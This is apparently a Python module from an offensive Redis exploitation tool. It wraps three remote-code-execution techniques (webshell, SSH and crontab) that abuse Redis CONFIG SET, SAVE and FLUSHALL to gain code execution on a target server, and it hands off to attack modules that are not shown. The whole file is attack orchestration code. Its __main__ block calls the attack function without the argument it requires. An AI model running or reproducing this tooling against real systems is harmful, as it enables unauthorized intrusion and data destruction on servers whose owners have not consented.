from .utils import save_old_data
from .common import get_assume_defaults_value, \
        get_attack_help_message, \
        proceed_with_cached_connection
from importlib import import_module



AVAILABLE_ATTACKS = [
    "webshell",
    "ssh",
    "crontab"
]



def perform_rce_help():
    return "\nIt's a wrapper function that takes\n" \
    "user-input and then performs the specified\n" \
    "attack technique. 3 techniques are available:\n" \
    "1. webshell\n" \
    "2. ssh\n" \
    "3. crontab\n"



def pre_attack_conditions(attack_name):

    print ("\nMake sure you connect to Redis as a user with access to")
    print ("'SET', 'CONFIG SET', 'SAVE' and 'FLUSHALL'/'FLUSHDB' commands.")

    assume_defaults = get_assume_defaults_value()

    if not attack_name:
        attack_name = "ssh" # default exec attack

        if not assume_defaults:
            attack_name = (input("\nWhich technique would like to use?\n" \
                "(1) webshell\n(2) ssh [default]\n(3) crontab (OS=RedHat)\n\n" \
                "Specify a technique: (1/2/3) ") or attack_name).lower()

    # The id of the attack based on it's position in the AVAILABLE_ATTACKS array.
    attack_ids = [ str(_) for _ in range(1, len(AVAILABLE_ATTACKS) + 1) ]

    if attack_name in AVAILABLE_ATTACKS:
        return attack_name

    elif attack_name in attack_ids:
        return AVAILABLE_ATTACKS[int(attack_name) - 1]

    else:
        print ("\n[-] Invalid attack type.\n")
        return



def perform_exec_attack(attack_name):

    attack_name = pre_attack_conditions(attack_name)

    if not attack_name:
        return

    redis = proceed_with_cached_connection()
    pipeline = redis.pipeline(transaction = True)

    dir = save_old_data(pipeline)

    if not dir:
        # Got back err
        return

    getattr(import_module(f".{attack_name}", "modules.rce"), attack_name)(pipeline, dir)



def ssh_help():
    return get_attack_help_message("ssh")

def ssh():
    perform_exec_attack("ssh")



def webshell_help():
    return get_attack_help_message("webshell")

def webshell():
    perform_exec_attack("webshell")



def crontab_help():
    return get_attack_help_message("crontab")

def crontab():
    perform_exec_attack("crontab")



def get_available_attacks():
    return AVAILABLE_ATTACKS



if __name__ == "__main__":
    perform_exec_attack()